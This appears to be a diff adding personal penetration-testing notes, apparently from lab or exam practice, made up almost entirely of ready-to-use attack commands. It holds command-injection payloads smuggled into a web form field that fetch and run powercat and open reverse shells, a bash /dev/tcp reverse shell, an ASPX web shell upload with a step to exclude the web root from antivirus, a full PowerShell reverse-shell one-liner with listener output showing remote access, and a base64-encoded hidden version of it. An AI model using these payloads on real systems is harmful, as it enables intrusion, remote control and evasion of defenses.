@@ -1,0 +1,77 @@
+1)
+;IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.45.166/powercat.ps1");powercat -c 192.168.45.166 -p 4444 -e powershell
+curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F192.168.45.166%2Fpowercat.ps1%22)%3Bpowercat%20-c%20192.168.45.166%20-p%204444%20-e%20powershell' http://192.168.231.189:8000/archive
+
+2)
+;sudo -l
+curl -X POST --data 'Archive=git%3Bsudo%20-l' http://192.168.231.16/archive
+
+;nc 192.168.45.166 4444 -e /bin/bash
+curl -X POST --data 'Archive=git%3Bnc%20192.168.45.166%204444%20-e%20/bin/bash' http://192.168.231.16/archive
+
+3)
+test"&&bash -c 'bash -i >& /dev/tcp/192.168.45.166/4444 0>&1' "
+
+4)
+┌──(kali㉿kali)-[~]
+└─$ cp /usr/share/webshells/aspx/cmdasp.aspx .     
+                                                        
+┌──(kali㉿kali)-[~]
+└─$ python3 -m http.server 8000
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+
+PS C:\inetpub\wwwroot> wget http://10.10.14.10:8000/cmdasp.aspx -O cmdasp.aspx
+
+
+Install .NET Extensibility 4.8 and ASP.NET 4.8
+
+Add a Windows Defender exclusion for the web root
+
+
+┌──(kali㉿kali)-[~]
+└─$ firefox http://web02.ad.lab/cmdasp.aspx
+
+
+powershell -nop -c "$c=New-Object System.Net.Sockets.TCPClient('10.10.14.10',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String);$sb2=$sb+'PS '+(pwd).Path+'>'; $sb=$([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"
+
+
+┌──(kali㉿kali)-[~]
+└─$ nc -nvlp 4444          
+listening on [any] 4444 ...
+connect to [10.10.14.10] from (UNKNOWN) [10.10.14.40] 53888
+pwd
+
+Path                       
+----                       
+C:\Windows\System32\inetsrv
+
+
+PS C:\Windows\System32\inetsrv>whoami
+ad\iis_service
+
+-------------------
+Reverse Shell from PowerShell
+PS C:\Users\user> type script.ps1
+$command = @'
+$client = New-Object System.Net.Sockets.TCPClient('192.168.48.152',4446);
+$stream = $client.GetStream();
+[byte[]]$bytes = 0..65535|%{0};
+while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){
+    $data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
+    $sendback=(iex $data 2>&1 | Out-String );
+    $sendback2=$sendback+'PS '+(pwd).Path+'> ';
+    $sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);
+    $stream.Write($sendbyte,0,$sendbyte.Length);
+    $stream.Flush()
+}
+'@
+
+$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
+$encodedCommand = [Convert]::ToBase64String($bytes)
+
+$encodedCommand
+
+PS C:\Users\user> .\script.ps1
+JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQA5ADIALgAxADYAOAAuADQAOAAuADEANQAyACcALAA0ADQANAA2ACkAOwANAAoAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsADQAKAFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsADQAKAHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAwACwAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7AA0ACgAgACAAIAAgACQAZABhAHQAYQA9ACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAkAGkAKQA7AA0ACgAgACAAIAAgACQAcwBlAG4AZABiAGEAYwBrAD0AKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwANAAoAIAAgACAAIAAkAHMAZQBuAGQAYgBhAGMAawAyAD0AJABzAGUAbgBkAGIAYQBjAGsAKwAnAFAAUwAgACcAKwAoAHAAdwBkACkALgBQAGEAdABoACsAJwA+ACAAJwA7AA0ACgAgACAAIAAgACQAcwBlAG4AZABiAHkAdABlAD0AKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwANAAoAIAAgACAAIAAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsADQAKACAAIAAgACAAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkADQAKAH0A
+
+PS C:\Users\user> powershell.exe -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQA5ADIALgAxADYAOAAuADQAOAAuADEANQAyACcALAA0ADQANAA2ACkAOwANAAoAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsADQAKAFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsADQAKAHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAwACwAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7AA0ACgAgACAAIAAgACQAZABhAHQAYQA9ACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAkAGkAKQA7AA0ACgAgACAAIAAgACQAcwBlAG4AZABiAGEAYwBrAD0AKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwANAAoAIAAgACAAIAAkAHMAZQBuAGQAYgBhAGMAawAyAD0AJABzAGUAbgBkAGIAYQBjAGsAKwAnAFAAUwAgACcAKwAoAHAAdwBkACkALgBQAGEAdABoACsAJwA+ACAAJwA7AA0ACgAgACAAIAAgACQAcwBlAG4AZABiAHkAdABlAD0AKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwANAAoAIAAgACAAIAAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsADQAKACAAIAAgACAAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkADQAKAH0A
